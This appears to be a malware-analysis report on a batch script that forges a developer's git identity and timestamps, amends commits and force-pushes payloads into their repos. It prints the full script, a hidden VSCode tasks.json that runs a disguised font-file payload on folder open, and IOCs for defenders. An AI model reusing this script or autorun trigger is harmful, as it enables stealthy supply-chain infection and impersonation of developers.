# Task AU: `temp_auto_push.bat` Reverse Engineering

## Source

Retrieved from `saif72437/Email-Layout-Builder` (and 4 other repos).  
File size: **1036 bytes**. Git blob SHA: `5549c357daab7541a1dd847bc3b0feabfcdae430`.  
Byte-identical across all 5 saif72437 repos where it appears.

---

## Full File Content

```batch
@echo off
rem No Windows "date"/"time" commands: they prompt and require locale formats (e.g. yy-mm-dd), which breaks bots.
for /f "delims=" %%A in ('cmd /c "git log -1 --format=%%aI"') do set GIT_AUTHOR_DATE=%%A
for /f "delims=" %%A in ('cmd /c "git log -1 --format=%%cI"') do set GIT_COMMITTER_DATE=%%A
for /f "delims=" %%A in ('cmd /c "git log -1 --format=%%s"') do set LAST_COMMIT_TEXT=%%A
for /f "delims=" %%A in ('cmd /c "git log -1 --format=%%an"') do set USER_NAME=%%A
for /f "delims=" %%A in ('cmd /c "git log -1 --format=%%ae"') do set USER_EMAIL=%%A
for /f "delims=" %%A in ('git rev-parse --abbrev-ref HEAD') do set CURRENT_BRANCH=%%A
echo %GIT_AUTHOR_DATE%
echo %LAST_COMMIT_TEXT%
echo %USER_NAME% (%USER_EMAIL%)
echo Branch: %CURRENT_BRANCH%
git config --local user.name %USER_NAME%
git config --local user.email %USER_EMAIL%
git add .
git commit --amend -m "%LAST_COMMIT_TEXT%" --no-verify
echo Amend complete; author/committer timestamps preserved via GIT_* env.
git push -uf origin %CURRENT_BRANCH% --no-verify
@echo on
```

---

## Functional Analysis

### Step 1 — Harvest victim git identity (lines 3–8)

```batch
git log -1 --format=%%aI    → GIT_AUTHOR_DATE    (ISO 8601 author timestamp)
git log -1 --format=%%cI    → GIT_COMMITTER_DATE (ISO 8601 committer timestamp)
git log -1 --format=%%s     → LAST_COMMIT_TEXT   (commit subject line)
git log -1 --format=%%an    → USER_NAME          (author display name)
git log -1 --format=%%ae    → USER_EMAIL         (author email)
git rev-parse --abbrev-ref HEAD → CURRENT_BRANCH
```

All six values are read from the victim's **last legitimate commit**. The actor's injected
commit will be indistinguishable from the victim's actual work.

### Step 2 — Progress echo (lines 9–12)

```batch
echo %GIT_AUTHOR_DATE%
echo %LAST_COMMIT_TEXT%
echo %USER_NAME% (%USER_EMAIL%)
echo Branch: %CURRENT_BRANCH%
```

Diagnostic output — confirms the script is running correctly on each repo. In automated use
this output would be captured by the orchestrator for logging.

### Step 3 — Impersonate developer (lines 13–14)

```batch
git config --local user.name %USER_NAME%
git config --local user.email %USER_EMAIL%
```

Sets the git identity **locally** (`.git/config` only, not global). The commit will be
attributed to the victim's name and email address. Scoped to the specific repo.

### Step 4 — Stage everything (line 15)

```batch
git add .
```

Stages ALL untracked and modified files in the working directory — including the payload
files placed by Stage 3/4, AND the bat file itself. No selective staging. This is the
OPSEC failure that committed `temp_auto_push.bat` to victim repos.

### Step 5 — Amend last commit with forgery (line 16)

```batch
git commit --amend -m "%LAST_COMMIT_TEXT%" --no-verify
```

Rewrites the HEAD commit to include the newly staged files. Key properties:
- `--amend`: rewrites history rather than creating a new commit; victim's git log shows
  only one commit with the same message
- `GIT_AUTHOR_DATE` env var: git reads this automatically and sets the amend's author
  timestamp to the victim's original value
- `GIT_COMMITTER_DATE` env var: git reads this and sets the committer timestamp to match
- Result: **author date == committer date == victim's original commit date** — no
  detectable timestamp gap
- `--no-verify`: bypasses pre-commit hooks (linting, secrets scanning, etc.)

### Step 6 — Force push (line 18)

```batch
git push -uf origin %CURRENT_BRANCH% --no-verify
```

- `-f`: force push — overwrites remote commit history with the amended commit
- `-u`: sets upstream tracking branch
- `--no-verify`: bypasses pre-push hooks

---

## Timestamp Forgery — Complete Analysis

This bat produces the **most complete forgery** in the PolinRider toolkit:

| Attribute | Value in injected commit |
|-----------|--------------------------|
| Author name | Victim's name (from `git log`) |
| Author email | Victim's email (from `git log`) |
| Author date | Victim's last commit date (GIT_AUTHOR_DATE) |
| Committer name | Victim's name (git config --local) |
| Committer email | Victim's email (git config --local) |
| Committer date | Victim's last commit date (GIT_COMMITTER_DATE) |
| Commit message | Victim's last commit message (--amend) |

**Author date == Committer date** — the timestamp gap detection used in the zurichjs
investigation does NOT apply here. These commits are forensically indistinguishable from
legitimate developer commits without inspecting the `pushed_at` API field vs the commit date.

The only reliable detection signal: `pushed_at` timestamp on the repo (true push date) vs
the forged commit timestamp. E.g., `works-studio`: commit forged to `2025-06-11`, actual
`pushed_at` = `2026-06-15T08:43:27Z` — a full year gap.

### Comparison with config.bat (Task H)

| Feature | `config.bat` | `temp_auto_push.bat` |
|---------|-------------|---------------------|
| Author timestamp | Forged via system clock change | Forged via GIT_AUTHOR_DATE env |
| Committer timestamp | NOT forged (system clock restored first) | Forged via GIT_COMMITTER_DATE env |
| Timestamp gap | Author < committer gap **present** | **No gap — perfectly matched** |
| System clock manipulation | Yes (V1), partial (V2) | **No** — reads from git log only |
| Detection signal | Timestamp gap (zurichjs method) | **None** — only `pushed_at` gap |

`temp_auto_push.bat` is the more sophisticated tool. It produces undetectable forgeries
by exploiting git's `GIT_AUTHOR_DATE` / `GIT_COMMITTER_DATE` env var overrides — a
documented git feature that config.bat did not use.

---

## Developer Comment — Evolution Evidence

```batch
rem No Windows "date"/"time" commands: they prompt and require locale formats (e.g. yy-mm-dd), which breaks bots.
```

This comment reveals the **prior version of the forgery method** and why it was abandoned:

1. **Original approach**: Actor used Windows `date` / `time` commands to manipulate the
   system clock before committing (same as config.bat V1)
2. **Locale failure**: On Korean-locale Windows machines, the `date` command prompts in
   `yy-mm-dd` format rather than the expected `MM/dd/yy`. Parsing this output in a bat
   script breaks when the locale changes
3. **Solution**: Read the dates directly from `git log --format=%aI` (ISO 8601, locale-
   independent) and pass them as env vars — no system clock manipulation needed
4. **"Breaks bots"**: The word "bots" confirms automated execution — this script is
   called from an orchestrator loop, not run manually per-repo

The locale issue specifically affects Korean Windows installations. saif72437 is a Pakistani
developer; the target pool included machines across multiple locales.

---

## Injection Commit Structure (works-studio example)

Commit SHA `2540e0071d39`, forged to `2025-06-11T07:05:52Z`, actual `pushed_at` `2026-06-15T08:43:27Z`:

```
added   .gitignore
added   .vscode/extensions.json       ← cover
added   .vscode/launch.json           ← cover
added   .vscode/settings.json         ← cover
added   .vscode/spellright.dict       ← cover
added   .vscode/tasks.json            ← INJECTION TRIGGER (799B)
modified README.md                    ← minor cover change
added   public/fonts/README.md        ← cover
added   public/fonts/fa-brands-400.*  ← cover (real FontAwesome, 5 formats)
added   public/fonts/fa-regular-400.* ← cover (real FontAwesome, 5 formats)
added   public/fonts/fa-solid-400.woff2 ← PAYLOAD (5533B, SHA 8e14837c, campaign 8-**)
added   public/fonts/fa-solid-900.*   ← cover (real FontAwesome, 5 formats)
added   temp_auto_push.bat            ← OPSEC FAILURE (accidentally staged by git add .)
```

The actor added 22 legitimate FontAwesome files as cover — consistent with the NikhilGupta777
atob dropper batch (Task AP). This is standard procedure in the Jun-15 wave; earlier batches
(madeeldev, SajidAfridi) added only tasks.json + woff2.

---

## Execution Workflow (inferred)

The bat is a single-repo tool. An external orchestrator (Stage 3 socket.io `ss_eval`,
Stage 4 Python bootstrapper, or Stage 5 Python infostealer) must:

1. Enumerate victim's local git repos (likely via `find ~ -name .git -maxdepth 5`)
2. For each repo: copy payload files into place (`fa-solid-400.woff2`, `tasks.json`, etc.)
3. `cd` into the repo and run `temp_auto_push.bat`

The saif72437 Jun-15 sweep covered **64 repos in 18 minutes** (08:25–08:43 UTC) — ~17
seconds per repo. This pace is consistent with automated sequential execution, not manual.

The outer loop script has not been recovered. It is likely a Python script delivered by
Stage 4/5 or a separate bat called by `temp_auto_push.bat`'s parent process.

---

## OPSEC Failure Analysis

The bat file appeared in victim repos because:
1. Actor placed `temp_auto_push.bat` in the victim's repo working directory as part of the
   infection payload drop (alongside tasks.json + woff2)
2. `git add .` staged everything in the directory — no exclude pattern for the bat itself
3. The bat script has no `git rm temp_auto_push.bat` or `echo temp_auto_push.bat >> .gitignore`
   step before committing

**Expected workflow** (what should happen): The actor should either:
- Delete `temp_auto_push.bat` before running `git add .`
- Add it to `.gitignore` before the `git add .` step
- Use `git add` with explicit file paths rather than `.`

The fact that this error occurred across 24 repos in a single sweep suggests a systematic
omission — the actor's delivery script consistently placed the bat in the working directory
without cleanup. This may have been intentional in earlier versions (the bat deleted itself
after running) or an oversight introduced in the June 2026 update.

---

## Repos Confirmed (bat file present)

All 5 repos byte-identical SHA `5549c357`:

| Repo | pushed_at | Forged date |
|------|-----------|-------------|
| `saif72437/Email-Layout-Builder` | 2026-06-15T08:28:16Z | 2025-07-22T21:56:53Z |
| `saif72437/cool-sketch` | 2026-06-15T~08:xx | (varies) |
| `saif72437/full-stack-medium-clone` | 2026-06-15T~08:xx | (varies) |
| `saif72437/saif72437` | 2026-06-15T08:40:27Z | (varies) |
| `saif72437/real-estate-app` | 2026-06-15T08:33:11Z | (varies) |
| `saif72437/works-studio` | 2026-06-15T08:43:27Z | 2025-06-11T07:05:52Z |
| `saif72437/medium-clone` | 2026-06-15T08:30:34Z | 2025-06-11T08:23:41Z |

(Task N documented 24 total repos with the bat file across the full Jun-15 sweep.)

---

## tasks.json — Standard Template

```json
{
  "version": "2.0.0",
  "tasks": [{
    "label": "eslint-check",
    "type": "shell",
    "command": "(command -v node >/dev/null 2>&1 && node ./public/fonts/fa-solid-400.woff2) || (where node >nul 2>&1 && node ./public/fonts/fa-solid-400.woff2) || echo ''",
    "problemMatcher": [],
    "isBackground": true,
    "hide": true,
    "runOptions": { "runOn": "folderOpen" }
  }]
}
```

Cross-platform: `command -v node` (Unix) || `where node` (Windows). `hide: true` suppresses
task visibility in VSCode UI. `runOn: folderOpen` fires on repo open without user interaction.

---

## IOCs

| Type | Value |
|------|-------|
| Bat file blob SHA | `5549c357daab7541a1dd847bc3b0feabfcdae430` (1036 bytes) |
| Bat file characteristic | `GIT_AUTHOR_DATE` + `GIT_COMMITTER_DATE` env forgery; `--no-verify` on both commit and push |
| tasks.json blob SHA | `5e226620d2e360205cc8634e3c581a008d382561` (799 bytes) |
| tasks.json label | `eslint-check` |
| Payload path | `public/fonts/fa-solid-400.woff2` |
| Cover files | `public/fonts/fa-brands-400.*`, `fa-regular-400.*`, `fa-solid-900.*` (all formats) |
| `.vscode/` cover files | `extensions.json`, `launch.json`, `settings.json`, `spellright.dict` |

---

## Assessment

`temp_auto_push.bat` is the **Stage 3/4/5 → GitHub propagation tool**. Once the actor has
code execution on a developer's machine, this bat automates mass infection of every local
git repo by:

1. Impersonating the developer identity (name, email, timestamp) — undetectable in git log
2. Injecting the VSCode task payload alongside a legitimate FontAwesome cover set
3. Force-pushing to GitHub using the victim's cached credentials (git credential store)

The locale comment and "breaks bots" language confirm this is production automation, not
a one-off tool. The perfect timestamp forgery (both author AND committer matched) means
**standard git log inspection cannot detect these injections** — only the GitHub API
`pushed_at` field reveals the true infection date.

The OPSEC failure (bat committed alongside payloads) appears to be a systematic oversight
in the June 2026 wave, not a one-time error. The actor did not add a cleanup step to remove
the bat before `git add .`. This failure exposes the full infection tool to any developer
who `git pull`s from an infected repo.
